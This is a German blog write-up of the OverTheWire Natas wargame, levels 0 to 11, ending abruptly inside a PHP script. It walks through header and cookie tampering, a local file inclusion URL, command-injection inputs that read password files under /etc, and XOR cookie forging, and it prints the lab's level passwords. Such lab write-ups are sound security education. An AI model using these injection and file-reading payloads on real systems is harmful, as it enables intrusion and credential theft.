<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="m10x ">
<meta name="description" content="Einleitung Wargames OverTheWire.org bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &amp;ldquo;Wargame&amp;rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &amp;ldquo;Was ist eigentlich ein Wargame?&amp;rdquo;.
Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt." />
<meta name="keywords" content="m10x, ctf, penetration test, overthewire, ctf, german" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/" />


    <title>
        
            OverTheWire Natas WriteUp - Level 0 bis 14 :: Maximilian Hildebrand  — German Penetration Testing Blog
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">
    <meta name="theme-color" content="">



<meta itemprop="name" content="OverTheWire Natas WriteUp - Level 0 bis 14">
<meta itemprop="description" content="Einleitung Wargames OverTheWire.org bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &ldquo;Wargame&rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &ldquo;Was ist eigentlich ein Wargame?&rdquo;.
Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt."><meta itemprop="datePublished" content="2018-02-13T21:27:56+01:00" />
<meta itemprop="dateModified" content="2018-02-13T21:27:56+01:00" />
<meta itemprop="wordCount" content="2519"><meta itemprop="image" content="/"/>
<meta itemprop="keywords" content="overthewire,ctf,german," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="OverTheWire Natas WriteUp - Level 0 bis 14"/>
<meta name="twitter:description" content="Einleitung Wargames OverTheWire.org bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &ldquo;Wargame&rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &ldquo;Was ist eigentlich ein Wargame?&rdquo;.
Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt."/>




    <meta property="og:title" content="OverTheWire Natas WriteUp - Level 0 bis 14" />
<meta property="og:description" content="Einleitung Wargames OverTheWire.org bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &ldquo;Wargame&rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &ldquo;Was ist eigentlich ein Wargame?&rdquo;.
Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/" /><meta property="og:image" content="/"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2018-02-13T21:27:56+01:00" />
<meta property="article:modified_time" content="2018-02-13T21:27:56+01:00" />







    <meta property="article:published_time" content="2018-02-13 21:27:56 &#43;0100 CET" />









    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-114772594-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">$ cd /home/m10x/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/summary/">Summary</a></li><li><a href="/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        12 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="/posts/2018/02/overthewire-natas-writeup-level-0-bis-14/">OverTheWire Natas WriteUp - Level 0 bis 14</a>
      </h1>

      

      

      

      <div class="post-content">
        <h2 id="einleitung-wargames"><strong>Einleitung Wargames</strong></h2>
<p><a href="http://overthewire.org/wargames/">OverTheWire.org</a> bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff &ldquo;Wargame&rdquo; im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: &ldquo;Was ist eigentlich ein Wargame?&rdquo;.<br>
Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt. Wargames werden von verschiedenen Internetseiten angeboten und haben teilweise eine große Community. Eine Liste von Wargame Anbietern kannst du <a href="https://github.com/apsdehal/awesome-ctf#wargames">hier</a> finden.</p>
<h2 id="level-0"><strong>Level 0</strong></h2>
<p>Nachdem wir uns auf <a href="http://natas0.natas.labs.overthewire.org/">http://natas0.natas.labs.overthewire.org/</a> mit dem Nutzernamen <strong>natas0</strong> und Password <strong>natas0</strong> angemeldet haben, sehen wir eine Seite mit dem Text <strong>You can find the password for the next level on this page.</strong>.  Wenn wir uns den Seitenquelltext anzeigen lassen, finden wir bei Zeile 16 folgendes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&lt;!--The password <span style="color:#66d9ef">for</span> natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;
</code></pre></div><h2 id="level-0---level-1"><strong>Level 0 -&gt; Level 1</strong></h2>
<p>Diesmal ist das Password für das nächste Level wieder im Seitenquelltext versteckt, allerdings wird der Rechtsklick der Maus blockiert. Das ist aber kein Problem für uns, da wir mit <strong>Strg + U</strong> uns trotzdem den Seitenquelltext anzeigen lassen können. Bei Zeile 17 finden wir dann folgendes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&lt;!--The password <span style="color:#66d9ef">for</span> natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;
</code></pre></div><h2 id="level-1---level-2"><strong>Level 1 -&gt; Level 2</strong></h2>
<p>Wir sehen uns wieder zuerst den Seitenquelltext an. In Zeile 15 finden wir folgendes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&lt;img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;files/pixel.png&#34;</span>&gt;
</code></pre></div><p>Wenn wir nach <strong><a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a></strong> gehen, sehen wir dort eine Datei <strong>users.txt</strong>.<br>
In dieser steht:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># username:password</span>
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><h2 id="level-2---level-3"><strong>Level 2 -&gt; Level 3</strong></h2>
<p>Wenn wir uns den Seitenquelltext ansehen, finden wir diesmal nur den Kommentar <strong>&lt;!&ndash; No more information leaks!! Not even Google will find it this time&hellip; &ndash;&gt;</strong>.<br>
Sehen wir uns doch mal die <a href="http://natas3.natas.labs.overthewire.org/robots.txt">robots.txt</a> Datei an, welche bestimmte User-Agenten ausschließen kann, z.B. auch die Bots von Suchmaschinen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">User-agent: *
Disallow: /s3cr3t/
</code></pre></div><p>Der Ordner <strong>/s3cr3t/</strong> wird also von Suchmaschinen ausgeschlossen&hellip; Sehen wir uns diesen mal an.<br>
In dem Ordner befindet sich die Datei Users.txt mit dem Inhalt:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
</code></pre></div><h2 id="level-3---level-4"><strong>Level 3 -&gt; Level 4</strong></h2>
<p>Bei diesem Level müssen wir den <a href="https://de.wikipedia.org/wiki/Referrer">Referrer</a> veränder. Um das zu machen brauchen wir die Hilfe von Burp. Mit Burp können wir den Datenverkehr unterbrechen und Anfragen bearbeiten.<br>
Wenn wir auf <strong>Refresh Page</strong> klicken und Burp gerade unseren Verkehr unterbricht, können wir unter <strong>headers</strong> den Referrer von <strong>natas4</strong> zu <strong>natas5</strong> ändern.</p>
<p><a href="https://imgur.com/ywmvc52"><img src="https://imgur.com/ywmvc52.jpg" alt="burp"></a></p>
<p>Danach müssen wir das Request nur noch weiterleiten und schon wird uns das Passwort angezeigt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Access granted. The password <span style="color:#66d9ef">for</span> natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
</code></pre></div><h2 id="level-4---level-5"><strong>Level 4 -&gt; Level 5</strong></h2>
<p>Wenn wir uns einloggen, steht auf der Seite, dass wir keinen Zugriff haben, weil wir nicht eingeloggt sind. Das könnte eventuell daran liegen, dass ein Cookie falsch gesetzt ist.<br>
Mit dem Browser Addon **EditThisCookie **können wir den Inhalt von Cookies sehen und bearbeiten.</p>
<p><a href="https://imgur.com/v3q6uJ3"><img src="https://imgur.com/v3q6uJ3.jpg" alt="editthiscookie"></a></p>
<p>Es gibt also einen Cookie der <strong>loggedin</strong> heißt  und den Wert <strong>0</strong> besitzt. Wenn wir den Wert auf <strong>1</strong> setzen und die Seite neu laden, wird uns das Passwort für das nächste Level angezeigt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Access granted. The password <span style="color:#66d9ef">for</span> natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
</code></pre></div><h2 id="level-5---level-6"><strong>Level 5 -&gt; Level 6</strong></h2>
<p>Bei diesem Level hier müssen wir das richtige Password für das für <strong>Input Secret</strong> finden. Im Quelltext steht in Zeile 17:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">include <span style="color:#e6db74">&#34;includes/secret.inc&#34;</span>;
</code></pre></div><p>Wenn wir nun zu <strong><a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a></strong> gehen, finden wir:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FOEIUWGHFEEUHOFUOIU&#34;</span>;
</code></pre></div><p>Jetzt müssen wir nur noch das Secret einfügen, absenden und geschafft.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Access granted. The password <span style="color:#66d9ef">for</span> natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
</code></pre></div><h2 id="level-6---level-7"><strong>Level 6 -&gt; Level 7</strong></h2>
<p>Im Seitenquelltext steht in Zeile 21:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&lt;!-- hint: password <span style="color:#66d9ef">for</span> webuser natas8 is in /etc/natas_webpass/natas8 --&gt;
</code></pre></div><p>Wenn wir auf <strong>Home</strong> klicken sehen wir die URL <strong><a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a></strong></p>
<p>Hier können wir eine <a href="http://wiki.hackerboard.de/index.php/LFI_%26_RFI">LFI/RFI</a> Schwachstelle ausnutzen. Dafür müssen wir nur folgende URL eingeben:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://natas7.natas.labs.overthewire.org/index.php?page<span style="color:#f92672">=</span>/etc/natas_webpass/natas8
</code></pre></div><p>Jetzt wird uns das Password angezeigt: <strong>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</strong></p>
<h2 id="level-7---level-8"><strong>Level 7 -&gt; Level 8</strong></h2>
<p>Im Seitenquelltext sehen wir, dass unser Input mit der Variable <strong>$encodedSecret</strong> verglichen wird. Dazu wird unser Input erst in Base64 enkodiert, dann umgedreht und schließlich werden die Binär Daten in Hex konvertiert. Um an das richtige Secret zu kommen, müssen wir diesen Prozess umkehren.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$encodedSecret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;3d3d516343746d4d6d6c315669563362&#34;</span>;
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encodeSecret</span>($secret) {
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">strrev</span>(<span style="color:#a6e22e">base64_encode</span>($secret)));
}
</code></pre></div><p>Dazu können wir den Interactiven Modus von PHP benutzen:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# php7.2 -a
Interactive mode enabled

php &gt; echo base64_decode<span style="color:#f92672">(</span>strrev<span style="color:#f92672">(</span>hex2bin<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;3d3d516343746d4d6d6c315669563362&#39;</span><span style="color:#f92672">)))</span>;
oubWYf2kBq
</code></pre></div><p>Das Secret ist also <strong>oubWYf2kBq</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Access granted. The password <span style="color:#66d9ef">for</span> natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
</code></pre></div><h2 id="level-8---level-9"><strong>Level 8 -&gt; Level 9</strong></h2>
<p>In Zeile 29 vom Quelltext finden wir folgendes: <strong>passthru(&ldquo;grep -i $key dictionary.txt&rdquo;);</strong> Wobei <strong>$key</strong> unser Input ist.<br>
Es wird also ein Linux Befehl ausgeführt. Das können wir ausnutzen. Suchen wir zum Testen mal nach <strong>; ls</strong>.<br>
Durch das Semikolon wird der <strong>grep</strong>-Befehl beendet und <strong>ls</strong> wird ausgeführt. Unter <strong>/etc/natas_webpass</strong> befinden sich die Passwörter für alle Level.<br>
Wir haben immer nur die Rechte, die Datei für das derzeitige und das nächste Level zu lesen. Benutzen wir:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">; ls ../../../../etc/natas_webpass
</code></pre></div><p>Als Ausgabe werden uns die Passwort-Dateien aller Level aufgelistet. Lassen wir uns <strong>natas10</strong> doch mit <strong>cat</strong> ausgeben.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">;cat ../../../../etc/natas_webpass/natas10
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Output: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
</code></pre></div><h2 id="level-9---level-10"><strong>Level 9 -&gt; Level 10</strong></h2>
<p>Die Zeichen <strong>;</strong> und <strong>&amp;</strong> werden in diesem Level gefiltert, weswegen wir hier nicht wie in Level 9 vorgehen können.<br>
Allerdings können wir uns <strong>grep</strong> von nutzen machen. Der Befehl grep -i nimmt als ersten Parameter das Suchwort und alle danach folgenden als Datei in der gesucht werden soll. Also können wir einfach <strong>/etc/natas_webpass/natas11</strong> als zu durchsuchende Datei hinzunehmen.</p>
<p>Geben wir <strong>a /etc/natas_webpass/natas11</strong> ein&hellip;<br>
Der Buchstabe <strong>a</strong> scheint nicht im Passwort vorhanden zu sein.</p>
<p>Probieren wir <strong>u /etc/natas_webpass/natas11</strong> aus.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><h2 id="level-10---level-11"><strong>Level 10 -&gt; Level 11</strong></h2>
<p>Bei diesem Level haben wir einen XOR Verschlüsselten Cookie, welchen wir verändern müssen.<br>
Der Quelltext ist wie folgt:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">[<span style="color:#f92672">...</span>]  
$defaultdata <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>( <span style="color:#e6db74">&#34;showpassword&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;no&#34;</span>, <span style="color:#e6db74">&#34;bgcolor&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;#ffffff&#34;</span>);

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xor_encrypt</span>($in) {  
  $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;censored&gt;&#39;</span>;  
  $text <span style="color:#f92672">=</span> $in;  
  $outText <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

  <span style="color:#75715e">// Iterate through each character  
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($text);$i<span style="color:#f92672">++</span>) {  
    $outText <span style="color:#f92672">.=</span> $text[$i] <span style="color:#f92672">^</span> $key[$i <span style="color:#f92672">%</span> <span style="color:#a6e22e">strlen</span>($key)];  
  }

  <span style="color:#66d9ef">return</span> $outText;  
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadData</span>($def) {  
  <span style="color:#66d9ef">global</span> $_COOKIE;  
  $mydata <span style="color:#f92672">=</span> $def;  
  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;data&#34;</span>, $_COOKIE)) {  
    $tempdata <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>(<span style="color:#a6e22e">xor_encrypt</span>(<span style="color:#a6e22e">base64_decode</span>($_COOKIE[<span style="color:#e6db74">&#34;data&#34;</span>])), <span style="color:#66d9ef">true</span>);  
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_array</span>($tempdata) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;showpassword&#34;</span>, $tempdata) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;bgcolor&#34;</span>, $tempdata)) {  
      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span>, $tempdata[<span style="color:#e6db74">&#39;bgcolor&#39;</span>])) {  
        $mydata[<span style="color:#e6db74">&#39;showpassword&#39;</span>] <span style="color:#f92672">=</span> $tempdata[<span style="color:#e6db74">&#39;showpassword&#39;</span>];  
        $mydata[<span style="color:#e6db74">&#39;bgcolor&#39;</span>] <span style="color:#f92672">=</span> $tempdata[<span style="color:#e6db74">&#39;bgcolor&#39;</span>];  
      }  
    }  
  }  
  <span style="color:#66d9ef">return</span> $mydata;  
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveData</span>($d) {  
  <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">xor_encrypt</span>(<span style="color:#a6e22e">json_encode</span>($d))));  
}

$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">loadData</span>($defaultdata);

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;bgcolor&#34;</span>,$_REQUEST)) {  
  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span>, $_REQUEST[<span style="color:#e6db74">&#39;bgcolor&#39;</span>])) {  
    $data[<span style="color:#e6db74">&#39;bgcolor&#39;</span>] <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;bgcolor&#39;</span>];  
  }  
}

<span style="color:#a6e22e">saveData</span>($data);

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">&lt;h1&gt;natas11&lt;/h1&gt;  
</span><span style="color:#960050;background-color:#1e0010">&lt;div id=&#34;content&#34;&gt;  
</span><span style="color:#960050;background-color:#1e0010">&lt;body style=&#34;background: &lt;?=$data[&#39;bgcolor&#39;]?&gt;;&#34;&gt;  
</span><span style="color:#960050;background-color:#1e0010">Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt;
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">&lt;?  
</span><span style="color:#960050;background-color:#1e0010">if($data[&#34;showpassword&#34;] == &#34;yes&#34;) {  
</span><span style="color:#960050;background-color:#1e0010">  print &#34;The password for natas12 is &lt;censored&gt;&lt;br&gt;&#34;;  
</span><span style="color:#960050;background-color:#1e0010">}  
</span><span style="color:#960050;background-color:#1e0010">[...]  
</span><span style="color:#960050;background-color:#1e0010">?&gt;
</span></code></pre></div><p>Im Cookie Editor können wir sehen, dass der Cookie <strong>data</strong> den Wert <strong>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D</strong> enthält.</p>
<p><img src="https://imgur.com/Bt7rsUG.jpg" alt="cookiemanager"></p>
<p>Außerdem wissen wir dank des Quelltextes wie der entschlüsselte Wert lautet:</p>
<p><strong>&ldquo;showpassword&rdquo;=&gt;&ldquo;no&rdquo;, &ldquo;bgcolor&rdquo;=&gt;&quot;#ffffff&quot;</strong></p>
<p>Eine <strong>XOR Verschlüsselung</strong> ist einfach zu entschlüsseln, wenn man 2 der 3 folgenden Sachen weiß:</p>
<p>Der <strong>verschlüsselte Text</strong>, der <strong>entschlüsselte Text</strong> und der <strong>Schlüssel</strong> der zum verschlüsseln benutzt wird.<br>
Wir wissen die ersten beiden Sachen. Wir können nun die <strong>xor_encrypt</strong> Funktion anpassen, um den Schlüssel herauszufinden.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">#!/usr/bin/php
</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span> 
$cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&#39;</span>);

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xor_encrypt</span>($in)
{ 
  $text <span style="color:#f92672">=</span> $in; 
  $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#66d9ef">array</span>( <span style="color:#e6db74">&#34;showpassword&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;no&#34;</span>, <span style="color:#e6db74">&#34;bgcolor&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;#ffffff&#34;</span>));
  $outText <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

  <span style="color:#75715e">// Iterate through each character
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($text);$i<span style="color:#f92672">++</span>) 
  { 
    $outText <span style="color:#f92672">.=</span> $text[$i] <span style="color:#f92672">^</span> $key[$i <span style="color:#f92672">%</span> <span style="color:#a6e22e">strlen</span>($key)]; 
  } 
  <span style="color:#66d9ef">return</span> $outText; 
} 

<span style="color:#66d9ef">print</span> <span style="color:#a6e22e">xor_encrypt</span>($cookie); 
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Wenn wir die Datei nun ausführen erhalten wir: <strong>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</strong></p>
<p>Der Schlüssel ist also <strong>qw8J</strong></p>
<p>Wenn wir die Funktion erneut etwas anpassen, können wir verschlüsseln, was wir möchten.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&gt;</span><span style="color:#75715e">#!/usr/bin/php
</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span> 
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xor_encrypt</span>($in)
{ 
  $text <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#66d9ef">array</span>( <span style="color:#e6db74">&#34;showpassword&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;yes&#34;</span>, <span style="color:#e6db74">&#34;bgcolor&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;#ffffff&#34;</span>));
  $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qw8J&#34;</span>;
  $outText <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

